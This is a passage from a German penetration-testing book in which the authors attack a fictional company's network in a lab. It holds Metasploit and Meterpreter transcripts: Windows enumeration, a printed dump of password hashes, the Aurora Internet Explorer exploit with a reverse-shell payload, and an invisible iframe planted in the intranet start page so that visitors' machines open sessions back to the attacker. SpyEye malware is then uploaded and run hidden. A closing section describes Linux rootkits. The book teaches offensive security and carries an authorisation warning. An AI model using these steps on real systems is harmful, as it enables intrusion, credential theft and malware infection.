svchost.exe (1092). Migrating to 3820. [*] Migration completed successfully. [*] New server process: cmd.exe (3820) [*] Running Windows Local Enumerion Meterpreter Script [*] New session on 192.168.1.213:4444... [*] Saving general report to /root/.msf3/logs/winenum/INTRANET_20100220.121881763/INTRANET_20100220.1218-81763.txt [*] Output of each individual command is saved to /root/.msf3/logs/winenum/INTRANET_20100220.1218-81763\n486\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n[*] Checking if INTRANET is a Virtual Machine ........ [*] This is a VMware Workstation/Fusion Virtual Machine [*] Running Command List ... [*] running command arp -a [*] running command ipconfig /all [*] running command net view [*] running command netstat -nao [*] running command netstat -ns [*] running command cmd.exe /c set [*] running command ipconfig /displaydns [*] running command route print [*] running command net accounts [*] running command netstat -vb [*] running command net share [*] running command net group [*] running command net localgroup [*] running command net localgroup administrators [*] running command net group administrators [*] running command net session [*] running command tasklist /svc [*] running command netsh firewall show config [*] running command net user [*] running command net view /domain [*] running command gpresult /SCOPE USER /Z [*] running command gpresult /SCOPE COMPUTER /Z [*] Running WMIC Commands .... [*] running command wmic useraccount list [*] running command wmic service list brief [*] running command wmic logicaldisk get description,filesystem,name,size [*] running command wmic netlogin get name,lastlogon,badpasswordcount [*] running command wmic group list [*] running command wmic netuse get name,username,connectiontype,localname [*] running command wmic volume list brief [*] running command wmic netclient list brief [*] running command wmic nteventlog get path,filename,writeable [*] running command wmic share get name,path [*] running command wmic startup list full [*] running command wmic product get name,version [*] running command wmic rdtoggle list [*] running command wmic qfe [*] Extracting software list from registry [*] Dumping password hashes... [*] Hashes Dumped\n18.5 Der Tritt vors Schienbein: Exploits\n487\n[*] Getting Tokens... [*] All tokens have been processed [*] Dumping and Downloading the Registry [-] Error in script: NoMethodError undefined method 'each_line' for [\"HKCU\", \"HKLM\", \"HKCC\", \"HKCR\", \"HKU\"]:Array meterpreter >\nDie gewonnenen Daten werden in einem lokalen Verzeichnis f\u00fcr Logfiles abgelegt. Durch ls \u2013l erfahren wir mehr und blicken auf eine Vielzahl spannender Eintr\u00e4ge: root@discordia:~/.msf3/logs/winenum/INTRANET_20100220.1218-81763# ls -l total 164 -rw-r--r-- 1 root root 218 Feb 20 15:12 INTRANET_20100220.1218-81763.txt -rw-r--r-- 1 root root 150 Feb 20 15:12 arp__a.txt -rw-r--r-- 1 root root 724 Feb 20 15:12 cmd_exe__c_set.txt -rw-r--r-- 1 root root 68 Feb 20 15:13 gpresult__SCOPE_COMPUTER__Z.txt -rw-r--r-- 1 root root 68 Feb 20 15:13 gpresult__SCOPE_USER__Z.txt -rw-r--r-- 1 root root 713 Feb 20 15:17 hashdump.txt -rw-r--r-- 1 root root 752 Feb 20 15:12 ipconfig__all.txt -rw-r--r-- 1 root root 748 Feb 20 15:12 ipconfig__displaydns.txt -rw-r--r-- 1 root root 571 Feb 20 15:12 net_accounts.txt -rw-r--r-- 1 root root 119 Feb 20 15:12 net_group.txt -rw-r--r-- 1 root root 119 Feb 20 15:12 net_group_administrators.txt -rw-r--r-- 1 root root 117 Feb 20 15:12 net_localgroup.txt -rw-r--r-- 1 root root 304 Feb 20 15:12 net_localgroup_administrators.txt -rw-r--r-- 1 root root 37 Feb 20 15:12 net_session.txt -rw-r--r-- 1 root root 420 Feb 20 15:12 net_share.txt -rw-r--r-- 1 root root 363 Feb 20 15:12 net_user.txt -rw-r--r-- 1 root root 315 Feb 20 15:12 net_view.txt -rw-r--r-- 1 root root 176 Feb 20 15:12 net_view__domain.txt -rw-r--r-- 1 root root 1042 Feb 20 15:12 netsh_firewall_show_config.txt -rw-r--r-- 1 root root 1234 Feb 20 15:12 netstat__nao.txt -rw-r--r-- 1 root root 2017 Feb 20 15:12 netstat__ns.txt -rw-r--r-- 1 root root 305 Feb 20 15:12 netstat__vb.txt -rw-r--r-- 1 root root 0 Feb 20 15:17 programs_list.csv -rw-r--r-- 1 root root 1174 Feb 20 15:12 route_print.txt -rw-r--r-- 1 root root 3163 Feb 20 15:12 tasklist__svc.txt -rw-r--r-- 1 root root 659 Feb 20 15:17 tokens.txt -rw-r--r-- 1 root root 4977 Feb 20 15:16 wmic_group_list.csv -rw-r--r-- 1 root root 311 Feb 20 15:16 wmic_logicaldisk_get_description_filesystem_name_size.csv -rw-r--r-- 1 root root 579 Feb 20 15:16 wmic_netclient_list_brief.csv -rw-r--r-- 1 root root 429 Feb 20 15:16 wmic_netlogin_get_name_lastlogon_badpasswordcount.csv -rw-r--r-- 1 root root 21 Feb 20 15:16 wmic_netuse_get_name_username_connectiontype_localname.csv\n488\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n-rw-r--r-- 1 root root\n367 Feb 20 15:16\nwmic_nteventlog_get_path_filename_writeable.csv -rw-r--r-- 1 root root 21 Feb 20 15:16 wmic_product_get_name_version.csv -rw-r--r-- 1 root root 121 Feb 20 15:16 wmic_rdtoggle_list.csv -rw-r--r-- 1 root root 8289 Feb 20 15:16 wmic_service_list_brief.csv -rw-r--r-- 1 root root 161 Feb 20 15:16 wmic_share_get_name_path.csv -rw-r--r-- 1 root root 1133 Feb 20 15:16 wmic_startup_list_full.csv -rw-r--r-- 1 root root 3547 Feb 20 15:16 wmic_useraccount_list.csv -rw-r--r-- 1 root root 253 Feb 20 15:16 wmic_volume_list_brief.csv root@discordia:~/.msf3/logs/winenum/INTRANET_20100220.1218-81763#\nUnser Interesse gilt der Datei hashdump.txt, die LM- and NTLM-Passwort-Hashes der lokalen Windows-Benutzerkonten beinhaltet. Das Dumpfile der SAM-Datei enth\u00e4lt ausschlie\u00dflich verschl\u00fcsselt abgelegte Kennw\u00f6rter, der Inhalt erscheint auf den ersten Blick somit wertlos: root@discordia:~/.msf3/logs/winenum/INTRANET_20100220.1218-81763# cat hashdump.txt Administrator:500:0c15c70133c0cacba0cf6892cefc8833:167a7a68dea1d4fbd7b3f4f4 44690f24::: Administratorbackup?:1008:affdd8f2107e8de1aad3b435b51404ee:aae40f0edbd70a3a6530e9e15092e 843::: ASPNET:1007:72a8a798081c71ade052b8d124912c32:88925e347bc80f29ad5d9d33543b27 ca::: Developer:1009:4b5003bad47e37eea56ea65545af54a6:0a27543fe8c7917f83be28468aa 16ad3::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 ::: IUSR_0WQVBJQ3T32MEG8?:1003:2992793e3144986ba1364e438266774d:11f5319054f5576 962d058e297869799::: IWAM_0WQVBJQ3T32MEG8:1004:bc1f709e97bc7c913a1cdd7f6b36f3bb:ed24cca5b43a0de5 ca5033c21b0cfac8::: SUPPORT_388945a0?:1001:aad3b435b51404eeaad3b435b51404ee:fe3bd2020ba646ed3f3 75b91c0a3b2ff::: root@discordia:~/.msf3/logs/winenum/INTRANET_20100220.1218-81763#\nIn dem Wissen, dass viele Nutzer der Unsitte verfallen sind, Kennw\u00f6rter wiederzuverwenden, stellt dieser Fund jedoch ein willkommenes Ziel f\u00fcr eine sp\u00e4tere BruteForce-Attacke dar. Zumindest bietet es sich an, auf diese M\u00f6glichkeit zur\u00fcckzugreifen, sollten sich andere Mittel zur Eroberung fremder Rechner des gleichen Netzwerkverbunds als wirkungslos erweisen. Auf den Punkt gebracht: Das Metasploit Framework liefert anregende Exploits samt Payloads und er\u00f6ffnet dem angehenden Netzwerkforscher \u2013 verpackt unter einer strukturierten Oberfl\u00e4che \u2013 vielf\u00e4ltige M\u00f6glichkeiten. Unbedingt erw\u00e4hnenswert an dieser Stelle ist die autopwn-Funktion224, die durch\n224\nhttp://blog.metasploit.com/2006/09/metasploit-30-automated-exploitation.html\n18.6 Hurra, ich bin root \u2013 und nun?\n489\ndb_autopwn jede Menge Spa\u00dfpotenzial bietet. Die Autoren legen somit jedem interessierten Datenreisenden eine Einarbeitung in die vielf\u00e4ltigen Optionen des Programms ans Herz. Umfassende Dokumentationen zum Framework finden sich unter anderem auf der Website225 der Entwickler.\n18.6\nHurra, ich bin root \u2013 und nun?\nEine Frage, die sich f\u00fcr viele Eindringlinge stellt, ist die anschlie\u00dfende Integration des gekaperten Rechners in ein m\u00f6glichst sinnvolles Vorhaben. Viele Cyber-Kriminelle gehen hierbei mit erschreckend wenig Fantasie zu Werke: Der Rechner wird mit einem Trojaner best\u00fcckt, muss fortan sein Dasein als Zombie in einem Bot-Netz fristen und wird beispielsweise dazu gezwungen, unerw\u00fcnschte Werbe-E-Mails f\u00fcr potenzsteigernde Mittel zu versenden. Die Assimilation des verseuchten Rechners in einen willenlosen Bot ist die h\u00e4ufigste Form des Missbrauchs, wie der aktuelle Internet Security Threat Report226 ein weiteres Mal belegt. Wir als Autoren missbilligen ein derart r\u00fcpelhaftes Vorgehen zutiefst, nicht nur aus Gr\u00fcnden der Unsportlichkeit. Wir wenden uns stattdessen einem Bereich zu, der neben handwerklichen F\u00e4higkeiten zus\u00e4tzlichen Hirnschmalz erfordert und den Ehrgeiz weckt. Auch hier der erneute Hinweis, dass derartige Expeditionen nur im Auftrag des Eigent\u00fcmers erfolgen d\u00fcrfen. Andernfalls bleibt es \u2013 ob automatisiert oder in liebevoller Kleinarbeit durchgef\u00fchrt \u2013 h\u00f6chst illegaler Unfug, bei dem der Staatsanwalt keinerlei Spa\u00df versteht.\n18.7\nWindows-Rechner kontrollieren\nF\u00fcr das erste Szenario widmen wir uns der \u00bbVerbesserung\u00ab des \u00fcbernommenen Windows-Servers. Wir erinnern uns: Der Meterpreter gew\u00e4hrt uns als interessierten Netzwerkforscher \u2013 dem MS08-067 und Metasploit Framework sei Dank \u2013 mittlerweile Vollzugriff. Durch Nmap haben wir erfahren, dass der Server einen Webdienst zur Verf\u00fcgung stellt und im Netzwerk unter dem Namen \u00bbINTRANET\u00ab bekannt ist (vgl. Kapitel 18.4.2). Ein kurzer Blick mit dem Webbrowser offenbart Vielversprechendes (siehe Abb. 18.20). Bingo! Der Server scheint das Intranet des Unternehmens zu beinhalten. Ein echter Gl\u00fccksgriff! F\u00fcr gew\u00f6hnlich dienen Intranets dazu, dass sich Mitarbeiter \u00fcber neueste Meldungen sowie Regeln und Absprachen informieren k\u00f6nnen, derartige Plattformen stellen somit nicht selten ein Zentralgestirn der Unternehmenskommunikation dar. Diesen Umstand machen wir uns jetzt zunutze und erweitern die Einstiegsseite um einen eingebetteten Frame (IFrame) \u2013 ganz so, wie unl\u00e4ngst unter dem Codenamen \u00bbAurora\u00ab227 vermutlich chinesische Angreifer vorgegangen sind, die eine bis dahin unbe-\n225\nhttp://www.metasploit.com/documents/users_guide.pdf\n226\nhttp://www.symantec.com/about/news/release/article.jsp?prid=20090413_01\n227\nhttp://www.us-cert.gov/cas/techalerts/TA10-055A.html\n490\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nkannte Sicherheitsl\u00fccke im Internet Explorer228 ausnutzten und Unternehmen wie Google, Adobe und Dutzende weitere US-Firmen ausspionierten229.\nBild 18.20: Intranet der Discordia Werke AG\nIm Vorfeld setzen wir einen eigenen, pr\u00e4parierten Webserver in die Welt und greifen hierzu erneut zum Metasploit Framework: root@discordia:/opt/metasploit3/msf3# msfconsole _ _ _ | | (_)_ ____ ____| |_ ____ ___ ____ | | ___ _| |_ | \\ / _ ) _)/ _ |/___) _ \\| |/ _ \\| | _) | | | ( (/ /| |_( ( | |___ | | | | | |_| | | |__ |_|_|_|\\____)\\___)_||_(___/| ||_/|_|\\___/|_|\\___) |_|\n=[ + -- --=[ + -- --=[ =[\nmetasploit v3.3.4-dev [core:3.3 api:1.0] 521 exploits \u2013 245 auxiliary 193 payloads \u2013 23 encoders \u2013 8 nops svn r8569 updated 7 days ago (2010.02.20)\n228\nhttp://www.microsoft.com/technet/security/advisory/979352.mspx\n229\nhttp://siblog.mcafee.com/cto/operation-%E2%80%9Caurora%E2%80%9D-hit-google-others/\n18.7 Windows-Rechner kontrollieren\n491\nmsf > search aurora [*] Searching loaded modules for pattern 'aurora'... Exploits ======== Name ---windows/browser/ie_aurora Memory Corruption\nRank ---normal\nDescription ----------Microsoft Internet Explorer \"Aurora\"\nmsf > use exploit/windows/browser/ie_aurora msf exploit(ie_aurora) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf exploit(ie_aurora) > set LHOST 192.168.1.223 LHOST => 192.168.1.223 msf exploit(ie_aurora) > set URIPATH / URIPATH => / msf exploit(ie_aurora) > show options Module options: Name Current Setting -----------------SRVHOST 0.0.0.0 SRVPORT 8080 SSL false connections SSLVersion SSL3 should be used (accepted: SSL2, URIPATH / (default is random) WORKSPACE report data into\nRequired -------yes yes no\nDescription ----------The local host to listen on. The local port to listen on. Negotiate SSL for incoming\nno Specify the version of SSL that SSL3, TLS1) no The URI to use for this exploit no\nThe name of the workspace to\nPayload options (windows/meterpreter/reverse_tcp): Name ---EXITFUNC process LHOST LPORT\nCurrent Setting --------------process\nRequired -------yes\nDescription ----------Exit technique: seh, thread,\n192.168.1.223 4444\nyes yes\nThe local address The local port\n492\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nExploit target: Id -0\nmsf [*] msf [*] [*] [*] [*]\nName ---Automatic\nexploit(ie_aurora) > exploit Exploit running as background job. exploit(ie_aurora) > Started reverse handler on 192.168.1.223:4444 Using URL: http://0.0.0.0:8080/ Local IP: http://192.168.1.223:8080/ Server started.\nDie Wahl des Exploit f\u00e4llt auf die \u00bbAurora\u00ab Memory Corruption des Internet Explorers, die PAYLOAD liefert der Meterpreter, LHOST ist unser Notebook, SRVPORT steht per Default auf TCP 8080, und der URIPATH lautet schlichtweg \u00bb/\u00ab. Unsere Website steht somit unter der Adresse http://192.168.1.223:8080/ zur Verf\u00fcgung und ist bereit, die t\u00f6dliche Fracht auszuliefern. Um unsere Opfer auf die pr\u00e4parierte Website zu lenken, widmen wir uns erneut dem Intranet-Server und der dort laufenden Meterpreter-Session. Die Eingabe von ls c: offenbart mit Inetpub die \u00fcbliche Verzeichnisstruktur des IIS: meterpreter > ls c: Listing: c: =========== Mode ---100777/rwxrwxrwx 100666/rw-rw-rw40777/rwxrwxrwx 40777/rwxrwxrwx Settings 40777/rwxrwxrwx 100444/r--r--r-40777/rwxrwxrwx 100444/r--r--r-100555/r-xr-xr-x 40555/r-xr-xr-x 40777/rwxrwxrwx 40777/rwxrwxrwx Information\nSize ---0 0 0 0\nType ---fil fil dir dir\nLast modified ------------2010-02-06 21:09:10 2010-02-06 21:09:10 2010-02-13 11:05:36 2010-02-06 21:13:50\n+0100 +0100 +0100 +0100\nName ---AUTOEXEC.BAT CONFIG.SYS Config.Msi Documents and\n0 0 0 0 47772 0 0 0\ndir fil dir fil fil dir dir dir\n2010-02-06 2010-02-06 2010-02-27 2010-02-06 2006-03-22 2010-02-06 2010-02-20 2010-02-06\n+0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100\nFPSE_search IO.SYS Inetpub MSDOS.SYS NTDETECT.COM Program Files RECYCLER System Volume\n22:19:11 21:09:10 19:59:50 21:09:10 13:00:00 21:14:29 14:24:02 22:19:04\n18.7 Windows-Rechner kontrollieren\n493\n40777/rwxrwxrwx\n0\ndir\n2010-02-28 15:36:42 +0100\nWINDOWS\n100666/rw-rw-rw100444/r--r--r-100666/rw-rw-rw40777/rwxrwxrwx\n208 295536 603979776 0\nfil fil fil dir\n2010-02-06 2006-03-22 2010-02-28 2010-02-06\nboot.ini ntldr pagefile.sys wmpub\n21:05:19 13:00:00 15:52:42 21:09:43\n+0100 +0100 +0100 +0100\nmeterpreter >\nDerart informiert begeben wir uns mit cd c:/Inetpub/wwwroot in das Default-Verzeichnis des IIS und werfen anschlie\u00dfend durch ls einen Blick auf die HTML-Struktur des Webservers: meterpreter > cd c:/Inetpub/wwwroot meterpreter > ls Listing: c:\\Inetpub\\wwwroot =========================== Mode ---40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 100666/rw-rw-rw40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 100666/rw-rw-rw40777/rwxrwxrwx 100666/rw-rw-rw100666/rw-rw-rw100666/rw-rw-rw-\nSize ---0 0 0 0 0 1754 0 0 0 0 0 1433 0 13036 2806 2449\nType ---dir dir dir dir dir fil dir dir dir dir dir fil dir fil fil fil\nLast modified ------------2010-02-27 20:02:46 2010-02-27 19:59:50 2010-02-27 20:00:25 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:06 2010-02-06 22:19:29 2003-02-21 18:48:30 2010-02-06 22:19:06 2010-02-27 19:32:32 2003-02-21 18:48:30 2010-02-06 22:19:06\n+0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100 +0100\nName ---. .. Intranet-Dateien _private _vti_cnf _vti_inf.html _vti_log _vti_pvt _vti_script _vti_txt aspnet_client iisstart.htm images index.htm pagerror.gif postinfo.html\nmeterpreter >\nDie Datei index.htm erweckt unser Interesse. Wir lassen sie uns durch cat anzeigen: meterpreter > cat index.htm\n494\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDiscordia Werke AG \u2013 Intranet (...) meterpreter >\nUnser Verdacht, dass es sich bei der Datei index.htm um die Einstiegsseite des IntranetAngebots handelt, wird unmittelbar best\u00e4tigt. Mit einem edit index.htm f\u00fcgen wir dem HTML-Code einen eingebetteten Frame hinzu und verzahnen dadurch das offizielle Intranet-Angebot mit unserer pr\u00e4parierten Website. In Folge wird jedem, der das Intranet-Portal besucht, auch unsere Website pr\u00e4sentiert \u2013 unsichtbar und \u00bbhuckepack\u00ab, versteht sich. Zu guter Letzt lassen wir uns die modifizierte Datei durch cat anzeigen (der IFrameEintrag ist fett hervorgehoben). Wir beenden dann die Meterpreter-Session und warten auf das erste Opfer. meterpreter > edit index.htm meterpreter > cat index.htm Discordia Werke AG \u2013 Intranet (...) meterpreter > quit [*] Meterpreter session 1 closed.\n18.7 Windows-Rechner kontrollieren\n495\nWenig sp\u00e4ter laufen die ersten Opfer bei uns auf, sessions \u2013l liefert eine Zusammenfassung der einzelnen Meterpreter-Sessions: [*] Sending Microsoft Internet Explorer \"Aurora\" Memory client 192.168.1.227 [*] Sending stage (747008 bytes) [*] Meterpreter session 1 opened (192.168.1.223:4444 -> msf exploit(ie_aurora) > [*] Sending Microsoft Internet Memory Corruption to client 192.168.1.219 [*] Sending Microsoft Internet Explorer \"Aurora\" Memory client 192.168.1.215 [*] Sending Microsoft Internet Explorer \"Aurora\" Memory client 192.168.1.224 [*] Sending stage (747008 bytes) [*] Meterpreter session 2 opened (192.168.1.223:4444 -> [*] Sending stage (747008 bytes) [*] Meterpreter session 3 opened (192.168.1.223:4444 -> [*] Sending stage (747008 bytes) [*] Meterpreter session 4 opened (192.168.1.223:4444 -> sessions -l\nCorruption to\n192.168.1.227:1138) Explorer \"Aurora\" Corruption to Corruption to\n192.168.1.219:1068) 192.168.1.215:1074) 192.168.1.224:1071)\nActive sessions =============== Id -1 2 3 4\nDescription ----------Meterpreter Meterpreter Meterpreter Meterpreter\nTunnel -----192.168.1.223:4444 192.168.1.223:4444 192.168.1.223:4444 192.168.1.223:4444\n-> -> -> ->\n192.168.1.227:1138 192.168.1.219:1068 192.168.1.215:1074 192.168.1.224:1071\nmsf exploit(ie_aurora) >\nDurch sessions -i lassen sich die einzelnen Sitzungen aufrufen, ein sessions -i 1 schaltet uns beispielsweise auf den PC mit der IP-Adresse 192.168.1.227 \u2013 ein getuid liefert Details zum Rechner: msf exploit(ie_aurora) > sessions -i 1 [*] Starting interaction with 1... meterpreter > getuid Server username: PC1723\\Administrator meterpreter > sysinfo Computer: PC1723 OS : Windows XP (Build 2600, Service Pack 3). Arch : x86 Language: de_DE meterpreter >\n496\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n18.7.1 Integration von Schadsoftware Eine beliebte Methode, den kompromittierten Rechner weiter auszubauen, stellt der Transfer zus\u00e4tzlicher Programmpakete in Form von Schadsoftware dar, so etwa die bei Kriminellen beliebten Botnetz-Toolkits230 ZeuS oder SpyEye231. Die daf\u00fcr erforderlichen Schritte sind nicht kompliziert: \u00dcber den Meterpreter erfolgt durch das Kommando upload der Transfer einer Datei, die anschlie\u00dfend mit execute -f -H versteckt aufgerufen wird. Ein ps liefert uns eine \u00dcbersicht der laufenden Prozesse und die Gewissheit dar\u00fcber, die Schadsoftware erfolgreich platziert zu haben: meterpreter > upload Usage: upload [options] src1 src2 src3 ... destination Uploads local files and directories to the remote machine. OPTIONS: -r\nUpload recursively.\nmeterpreter > upload SpyEye.exe c:/windows [*] uploading : SpyEye.exe -> c:/windows [*] uploaded : SpyEye.exe -> c:/windows\\SpyEye.exe meterpreter > execute Usage: execute -f file [options] Executes a command on the remote machine. OPTIONS: -H -a -c -d -f -h -i -m -t\nCreate the process hidden from view. The arguments to pass to the command. Channelized I/O (required for interaction). The 'dummy' executable to launch when using -m. The executable command to run. Help menu. Interact with the process after creating it. Execute from memory. Execute process with currently impersonated thread token\nmeterpreter > execute -f c:/windows/SpyEye.exe -H Process 208 created. meterpreter > ps\n230\nhttp://www.h-online.com/security/news/item/Spy-versus-spy-926839.html\n231\nhttp://www.symantec.com/connect/de/blogs/spyeye-bot-versus-zeus-bot\n18.7 Windows-Rechner kontrollieren\n497\nProcess list ============ PID Name Arch User --------- ---0 [System Process] 4 System x86 608 smss.exe x86 NT-AUTORIT\u00a6T\\SYSTEM \\SystemRoot\\System32\\smss.exe 656 csrss.exe x86 NT-AUTORIT\u00a6T\\SYSTEM \\??\\C:\\WINDOWS\\system32\\csrss.exe 680 winlogon.exe x86 NT-AUTORIT\u00a6T\\SYSTEM \\??\\C:\\WINDOWS\\system32\\winlogon.exe 724 services.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\WINDOWS\\system32\\services.exe 736 lsass.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\WINDOWS\\system32\\lsass.exe 888 svchost.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\WINDOWS\\system32\\svchost.exe 964 svchost.exe x86 C:\\WINDOWS\\system32\\svchost.exe 1000 svchost.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\WINDOWS\\System32\\svchost.exe 1056 svchost.exe x86 C:\\WINDOWS\\System32\\svchost.exe 1100 svchost.exe x86 C:\\WINDOWS\\System32\\svchost.exe 1372 explorer.exe x86 PC1723\\Administrator C:\\WINDOWS\\Explorer.EXE 1424 spoolsv.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\WINDOWS\\system32\\spoolsv.exe 1520 igfxtray.exe x86 PC1723\\Administrator C:\\WINDOWS\\System32\\igfxtray.exe 1528 hkcmd.exe x86 PC1723\\Administrator C:\\WINDOWS\\System32\\hkcmd.exe 1544 jusched.exe x86 PC1723\\Administrator C:\\Programme\\Java\\jre6\\bin\\jusched.exe 1836 jqs.exe x86 NT-AUTORIT\u00a6T\\SYSTEM C:\\Programme\\Java\\jre6\\bin\\jqs.exe 296 alg.exe x86 C:\\WINDOWS\\System32\\alg.exe 568 iexplore.exe x86 PC1723\\Administrator Explorer\\iexplore.exe 208 SpyEye.exe x86 PC1723\\Administrator meterpreter >\nPath ----\nC:\\Programme\\Internet c:\\windows\\SpyEye.exe\n498\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDie Eingabe von CTRL-Z bringt uns zur\u00fcck an den Prompt des Metasploit Framework, durch sessions -i k\u00f6nnen \u2013 wie bereits verdeutlicht \u2013 weitere Sitzungen aufgerufen werden. meterpreter > Background session 1? [y/N] msf exploit(ie_aurora) >\nFestzuhalten ist, dass der Meterpreter und das Metasploit Framework ein m\u00e4chtiges und vielseitiges Instrument darstellen, bei dem der Fantasie kaum Grenzen gesetzt sind. Nicht unerw\u00e4hnt bleiben soll an dieser Stelle, dass das Metasploit-Team den Exploit f\u00fcr das hier demonstrierte Sicherheitsloch im Internet Explorer reproduziert und ein entsprechendes Modul in das Exploit-Framework eingebaut hatte, bevor Microsoft selbst einen Patch zur Verf\u00fcgung stellen konnte232 \u2013 das Metasploit Framework l\u00e4sst somit so manch einem die Nackenhaare aufstellen.\n18.8\nLinux unter Kontrolle: Rootkits installieren\nUnter Linux gestaltet sich der Einstieg in einen fremden Rechner im Regelfall spannender als unter Windows. Schlie\u00dflich liefert Linux umfassende administrative M\u00f6glichkeiten \u00fcber die Kommandozeile und bietet somit eine ideale Spielwiese f\u00fcr Netzwerkforscher. Wenn sich b\u00f6swillige Datenreisende unbefugten Zutritt zu einem Rechner verschaffen, wie im obigen Szenario geschildert, geht man grunds\u00e4tzlich davon aus, dass verr\u00e4terische Spuren z. B. in Logfiles und Verzeichnissen auftauchen, die Hinweise auf das perfide Treiben liefern. Kaum eine Chance hat man jedoch, die Anzeichen auf einen Einbruch \u00fcberhaupt wahrzunehmen, wenn sich T\u00e4ter sogenannter Rootkits bedienen. Als Rootkit bezeichnet man eine Sammlung von Werkzeugen, die oftmals nach dem Einbruch auf einem kompromittierten System eingebunden werden. Das Ziel von Rootkits ist es, die Aktivit\u00e4ten des Angreifers vor Systemadministratoren zu verbergen und sicherzustellen, dass der Schwarzfahrer jederzeit wieder bequem Zugriff auf das System erlangen kann. Schafft es der unerkannte Eindringling, sich erst einmal bis zu den Root-Rechten vorzuarbeiten, l\u00e4sst es sich bei Rootkits ohne Nutzung vertrauensvoller Quellen fast unm\u00f6glich feststellen, inwieweit das System kompromittiert wurde. In vielen F\u00e4llen geht die Einbindung von Rootkits mit der Integration weiterer Schadprogramme einher, wie beispielsweise Sniffer, Password-Cracker, Keylogger und Log-Cleaner, um anschlie\u00dfend weitere Systeme im Netzwerk einzunehmen. So entfernen beispielsweise Log-Cleaner unerw\u00fcnschte Eintr\u00e4ge aus Logfiles und machen es somit Systemadministratoren kompromittierter Systeme sehr schwer, den Vorgang nachzuvollziehen. Bei den klassischen Rootkits unter Linux werden Systembefehle und Sicherheitsprogramme ver\u00e4ndert oder durch trojanische Varianten ersetzt, die jedoch im Vergleich\n232\nhttp://www.metasploit.com/modules/exploit/windows/browser/ie_aurora\n18.8 Linux unter Kontrolle: Rootkits installieren\n499\nzum Original bestimmte Zusatzfunktionen aufweisen: Im Fokus steht die Unterdr\u00fcckung auff\u00e4lliger Merkmale, die auf einen unerw\u00fcnschten Untermieter schlie\u00dfen lassen. Beispielsweise werden die Befehle ps und netstat ausgetauscht, sodass Prozesse und Netzwerkverbindungen des Angreifers nicht angezeigt werden und dem Administrator somit keinen Aufschluss mehr dar\u00fcber geben, dass auf seinem System etwas Ungew\u00f6hnliches passiert. Modernere Varianten von Rootkits manipulieren direkt den Kernel, beispielsweise durch den Einsatz von Loadable Kernel Modules (LKM), und sind somit nicht mehr darauf angewiesen, Systemprogramme auszutauschen. Fast jede moderne Linux/UNIXVariante erlaubt es Systemadministratoren, Ger\u00e4tetreiber direkt in den Kernel zu laden. Es ist dank dieser Technologie nicht mehr notwendig, jedes erdenkliche Modul fest in den Kernel einzukompilieren. Rootkits auf LKM-Basis verwenden genau diese Option \u2013 das Rootkit wird als Loadable Kernel Module in den Kernel eingebunden, ersetzt Systemaufrufe und \u00e4ndert somit das Verhalten von Programmen, ohne diese auszutauschen zu m\u00fcssen, da mithilfe von Funktionsaufrufen bereits auf der Kernel-Ebene Interaktionen ausgef\u00fchrt werden. Der Effekt ist letztlich derselbe wie bei klassischen Rootkits: Prozesse, Dateien, Verbindungen und andere Informationen werden nicht mehr zuverl\u00e4ssig angezeigt. Die derzeit h\u00f6chste Stufe der Evolution unter Linux (von experimentellen \u00bbVirtual Machine Based Rootkits\u00ab (VMBR) wie Blue Pill233 einmal abgesehen, die sich Virtualisierungstechniken234 zunutze machen, oder Rootkits, die den \u00bbSystem Management Mode\u00ab (SMM)235 von Intel-Prozessoren nutzen, um einen Keylogger im Speicher zu verstecken) stellen Rootkits dar, die sich des Kernel-Memory-Patching bedienen: Anstatt eigene manipulierte Kernelfunktionen bereitzustellen (wie bei den LKM-Rootkits), schreiben sie ihren Code direkt in den Arbeitsspeicher (/dev/kmem236 oder /dev/mem237) und modifizieren so die Ausgabe von Programmen. In vielen F\u00e4llen offerieren diese derzeit gef\u00e4hrlichsten Rootkits weitere Gemeinheiten wie beispielsweise Erweiterungen durch Plugins oder Stealth-Backdoors. Derartig versteckte Hintert\u00fcren \u00f6ffnen sich erst, nachdem der Angreifer ein spezielles Paket an den kompromittierten Rechner geschickt hat \u2013 andernfalls ist die Einstiegsluke verschlossen und somit auch nicht auszumachen. Ein Beispiel aus der j\u00fcngeren Vergangenheit liefert die Meldung238 des Notfallteams vom DFN-CERT239, das Mitte des Jahres 2008 vor Attacken warnte, bei denen die Angreifer ihre Spuren mit einem Linux-Kernel-Rootkit240 verbargen. Damit Administratoren keinen Verdacht sch\u00f6pfen, versteckte das Rootkit bestimmte Verzeichnisse und Prozesse. Die Einbr\u00fcche erfolgten vermutlich \u00fcber gestohlene oder unsichere 